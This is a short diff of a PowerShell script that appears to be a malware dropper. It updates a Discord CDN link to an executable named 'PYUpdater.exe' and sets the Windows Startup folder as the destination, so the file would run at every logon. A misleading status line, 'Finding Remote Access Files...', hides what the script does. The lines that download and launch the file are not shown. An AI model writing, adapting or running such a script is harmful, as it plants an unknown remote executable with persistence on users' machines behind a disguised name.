@@ -1,5 +1,5 @@
 Write-Host "Finding Remote Access Files..."
-$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1524526091924930742/PYUpdater.exe?ex=6a501110&is=6a4ebf90&hm=baebb095219eb9e54a7d2cf7fafaf818829e76ad957ea58b80c56981c0e0fb3b&"
+$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1524526091924930742/PYUpdater.exe?ex=6a520b50&is=6a50b9d0&hm=e1791919db183be1eb835067ca8ebac9ad332b12aa45210d07781d49ca4d3438&"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $fn = "PYUpdater.exe"
 if (-not (Test-Path -Path $dest)) {
